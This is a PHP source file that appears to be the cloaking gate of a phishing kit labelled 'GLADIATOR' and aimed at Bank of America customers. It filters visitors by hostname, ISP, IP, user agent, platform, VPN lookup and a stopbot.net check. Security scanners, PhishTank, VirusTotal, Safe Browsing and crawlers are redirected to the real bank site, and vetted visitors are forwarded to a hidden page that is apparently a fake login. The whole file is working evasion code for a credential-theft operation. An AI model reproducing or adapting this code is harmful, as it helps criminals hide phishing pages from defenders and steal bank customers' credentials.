<?php
session_start();
error_reporting(0);

// Include external configuration files
include 'functions.php';

// Get the hostname of the remote address
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

// List of blocked words (bot hostnames or patterns)
$blocked_words = array(
    "teledata-fttx.de", "hicoria.com", "simtccflow1.etn.com", "above", "google", "softlayer", "amazonaws", "cyveillance",
    "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", 
    "torservers", "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "BitDefender", "mcafee", "antivirus", "cloudflare", 
    "avg", "avira", "avast", "ovh.net", "security", "twitter", "bitdefender", "virustotal", "phishing", "clamav", "baidu", 
    "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro", "aruba", "dyn.plus.net", "pagepeeker", "SPRO-NET-207-70-0", 
    "SPRO-NET-209-19-128", "vultr", "colocrossing.com", "geosr", "drweb", "dr.web", "linode.com", "opendns", 'cymru.com', 
    "sl-reverse.com", "surriel.com", "hosting", "orange-labs", "speedtravel", "metauri", "apple.com", "bruuk.sk", "sysms.net", 
    "oracle", "cisco", "amuri.net", "versanet.de", "hilfe-veripayed.com", "googlebot.com", "upcloud.host", "nodemeter.net", 
    "e-active.nl", "downnotifier", "online-domain-tools", "fetcher6-2.go.mail.ru", "uptimerobot.com", "monitis.com", "majestic12", 
    "as9105.com", "btcentralplus.com", "anonymizing-proxy", "digitalcourage.de", "triolan.net", "staircaseirony", "stelkom.net", 
    "comrise.ru", "kyivstar.net", "mpdedicated.com", "starnet.md", "progtech.ru", "hinet.net", "is74.ru", "shore.net", "cyberinfo", 
    "ipredator", "unknown.telecom.gomel.by", "minsktelecom.by", "parked.factioninc.com", "level3", "level", "involta", "SOLUTIONPRO-NET",
    "SOLUTION", "SolutionPro", "SPRO-NET-206-80-96", "LVLT-STATIC-4-14-16", "americanexpress", "tor-exit", "paypal", "coinbase"
);

// Check for blocked words in the hostname
foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        $file = fopen("logs/block_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|BOT BLOCKED BY GLADIATOR\n");
        fclose($file);
        $file = fopen("logs/total_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|HOSTNAME BLACKLIST\n");
        fclose($file);
        header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
        die();
    }  
}

// Block specific IPs (e.g., Google Safe Browsing)
if ($ip == "92.23.57.168" or $ip == "96.31.1.4" or $ip == "207.96.148.8") {
    $file = fopen("logs/block_bot.txt", "a");
    fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|BOT BLOCKED BY GLADIATOR\n");
    fclose($file);
    $file = fopen("logs/total_bot.txt", "a");
    fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|GOOGLE SAFEBROWSING BLACKLIST\n");
    fclose($file);
    header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
    die();
}

// List of banned ISPs
$banned_isp = array(
    "Peak 10", "Quasi Networks LTD", "SC Rusnano", "GoDaddy.com, LLC", "Server Plan S.r.l.", "Linode", "Blazing SEO", 
    "Lixux OU", "Inter Connects Inc", "Flokinet Ltd", "LukMAN Multimedia Sp. z o.o", "PIPEX-BLOCK1", "IPVanish", "LinkGrid LLC", 
    "Snab-Inform Private Enterprise", "Cisco Systems", "Network and Information Technology Limited", "London Wires Ltd.", 
    "Tehnologii Budushego LLC", "Eonix Corporation", "hosttech GmbH", "Wowrack.com", "SunGard Availability Services LP", 
    "Internap Network Services Corporation", "Palo Alto Networks", "PlusNet Technologies Ltd", "Scaleway", "Facebook", "Host1Plus",
    "XO Communications", "Nobis Technology Group", "ExpressVPN", "DME Hosting LLC", "Prescient Software", "Sungard Network Solutions",
    "OVH SAS", "Iomart Hosting Ltd", "Hosting Solution", "Barracuda Networks", "Sungard Network Solutions", "Solar VPS", 
    "PHPNET Hosting Services", "DigitalOcean", "Level 3 Communications", "softlayer", "Chelyabinsk-Signal LLC", "SoftLayer Technologies", 
    "Complete Internet Access", "london-tor.mooo.com", "amazonaws", "cyveillance", "phishtank", "tor.piratenpartei-nrw.de", "cpanel66.proisp.no",
    "tor-node.com", "dreamhost", "Involta", "exit0.liskov.tor-relays.net", "tor.tocici.com", "netpilot", "calyxinstitute", 
    "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "University of Virginia", "trendmicro", "ebay", "paypal", "torservers", 
    "comodo", "EGIHosting", "ebbs.healingpathsolutions.com", "healingpathsolutions.com", "Solution Pro", "Zayo Bandwidth"
);

// Check if the ISP is in the banned list
foreach ($banned_isp as $isp) {
    if (substr_count($ip, $isp) > 0) {
        $file = fopen("logs/block_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|BOT BLOCKED BY GLADIATOR\n");
        fclose($file);
        $file = fopen("logs/total_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|ISP BLACKLIST\n");
        fclose($file);
        header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
        die();
    }
}
if($settings['block_ua'] == "on") {
    $blocked = false;
    
    // Define user agents and operating systems that should be blocked
    $blocked_os = [
        "Windows Server 2003/XP x64", 
        "Windows Vista", 
        "Windows XP", 
        "Windows 7", 
        "Windows 2000", 
        "Chrome OS", 
        "BlackBerry", 
        "Linux", 
        "Unknown OS Platform"
    ];
    $blocked_browsers = [
        "Firefox", 
        "Internet Explorer", 
        "Chrome", 
        "Unknown Browser"
    ];
    
    // Check if the OS and browser match any blockable combinations
    foreach ($blocked_os as $os_value) {
        foreach ($blocked_browsers as $br_value) {
            if ($os == $os_value && $br == $br_value) {
                $blocked = true;
                break 2;  // Exit both loops
            }
        }
    }

    // Check for specific user agent strings
    $blocked_user_agents = [
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)"
    ];
    
    if (in_array($_SERVER['HTTP_USER_AGENT'], $blocked_user_agents)) {
        $blocked = true;
    }

    // Check for specific substrings in the user agent that might indicate a bot
    $blocked_words = array(
        "bot", "google", "yahoo", "bingbot", "crawler", "msnbot", "facebookexternalhit", "instagram", "telegram", "favicon", "java", "freebsd",
        "windows 95", "windows 98", "samsung-sgh-e250", "softlayer", "amazonaws", "googlebot", "bot/", "slurp", "spider", "seek", "virustotal",
        "privacy", "zipcommander", "python", "curl", "browsing", "majestic12", "dr.web", "security", "sogou", "ia_archiver", "webcore", "wget"
    );

    // Check if any blocked words are in the user agent
    foreach ($blocked_words as $word) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $word) !== false) {
            $blocked = true;
            break;
        }
    }

    // If the user agent is blocked, log the details and redirect to a help page
    if ($blocked) {
        $file = fopen("logs/block_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|$ip|$br|$os|BOT BLOCKED BY GLADIATOR\n");
        $file = fopen("logs/total_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|$ip|$br|$os|USER AGENT BLOCKED\n");
        fclose($file);
        header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
        die();
    }
}

if ($settings['lock_platform'] == "on") {
    // Check if the device is Apple (iPhone, iPad, iPod, Mac OS)
    if ($os == "iPhone" || $os == "iPad" || $os == "iPod" || $os == "Mac OS X" || $os == "Mac OS 9") {
        // Check if the site parameter is turned on
        if ($settings['site_param_on'] == "on") {
            $secret = $settings['site_parameter'];
            
            // Check if the required parameter is not present in the GET request
            if (!isset($_GET[$secret])) {
                // Log visitor's details when parameter is missing or incorrect
                $file = fopen("logs/total_bot.txt", "a");
                fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|WITHOUT or WRONG PARAMETER\n");
                fclose($file);

                // Log the bot activity and block it
                $file = fopen("logs/block_bot.txt", "a");
                fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|BOT BLOCKED BY GLADIATOR\n");
                fclose($file);

                // Redirect to an external page (Amazon Help)
                header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
                die();
            } else {
                
                // Redirect the user to the login page with the gladiator identifier
                header("Location: ap?infoPage=99dea78007133396a7b8ed70578ac6ae&gladiator=".generateRandomText(50)."");

                // Log the successful human visit
                $file = fopen("logs/human.txt", "a");
                fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|Human\n");
                fclose($file);
                die();
            }
        }
    } else {
        // If platform is not Apple, block the bot and log the details
        $file = fopen("logs/block_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|BOT BLOCKED BY GLADIATOR\n");
        $file = fopen("logs/total_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|LOCK PLATFORM BLOCKED\n");
        fclose($file);

        // Redirect to an external page (Amazon Help)
        header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
        die();
    }
}

// Get user IP
$ip = getUserIP();

// Check if VPN blocking is enabled
if ($settings['block_vpn'] == "on") {
    // If the IP is not the local IP (127.0.0.1), check the IP against a VPN service
    if ($ip != "127.0.0.1") {
        $url = "https://blackbox.ipinfo.app/lookup/".$ip;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);

        // If the response indicates that the IP is a VPN, block it
        if ($resp == "Y") {
            // Log the blocked bot activity
            $file = fopen("logs/block_bot.txt", "a");
            fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|BOT BLOCKED BY GLADIATOR\n");
            fclose($file);

            // Log the VPN block
            $file = fopen("logs/total_bot.txt", "a");
            fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|VPN BLOCKED\n");
            fclose($file);

            // Redirect to an external page (Amazon Help)
            header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
            die();
        }
    }
}
// Check if STOPBOT blocking is enabled
if ($settings['stopbot'] == "on") {
    $key = $settings['stopbot_key'];
    
    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
    // Make the API request to stopbot.net with the necessary parameters
    curl_setopt($ch, CURLOPT_URL, "https://stopbot.net/api/blocker?apikey=" . $key . "&ip=" . $ip . "&ua=" . urlencode($_SERVER['HTTP_USER_AGENT']) . "&url=" . urlencode($_SERVER['REQUEST_URI']));
        
    // Execute the request
    $data = curl_exec($ch);
    curl_close($ch);
        
    // Decode the JSON response
    $json = json_decode($data, true); 
        
    // Get the meta code and IP status from the response
    $isBot = $json["IPStatus"]["isBot"];

    // If the response indicates the user is a bot, block them
    if ($isBot == 1) {
        
        // Log the blocked bot's details in a log file
        $file = fopen("../logs/total_bot.txt", "a");
        $message = "|" . date("l d F H:i:s") . "|$countryname|" . $ip . "|$br|$os|BOT BLOCKED BY STOPBOT\n";
        fwrite($file, $message);
        fclose($file);
            
        // Log the blocked bot in another file
        $file = fopen("../logs/block_bot.txt", "a");
        fwrite($file, "|" . date("l d F H:i:s") . "|$countryname|" . $ip . "|$br|$os|BOT BLOCKED BY STOPBOT\n");
        fclose($file);
            
        // Redirect the bot to a page (e.g., Amazon help page)
        header("location: https://www.bankofamerica.com/security-center/privacy-overview/");
        exit();
    }
}
// Check if site parameter is enabled and validate it
if ($settings['site_param_on'] == "on") {
    $secret = $settings['site_parameter'];

    // If the required parameter is not set or is wrong
    if (!isset($_GET[$secret])) {
        $file = fopen("logs/total_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|WITHOUT or WRONG PARAMETER\n");
        fclose($file);
        $file = fopen("logs/block_bot.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|BOT BLOCKED BY GLADIATOR\n");
        fclose($file);
        
        // Redirect to an external page (Amazon Help)
        header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
        die();
    } else {
        
        // Redirect the user
        header("Location: ap?infoPage=99dea78007133396a7b8ed70578ac6ae&gladiator=".generateRandomText(50)."");

        // Log the user action
        $file = fopen("logs/human.txt", "a");
        fwrite($file, "|".date("l d F H:i:s")."|$countryname|".$ip."|$br|$os|Human\n");
        fclose($file);
        die();
    }
}
?>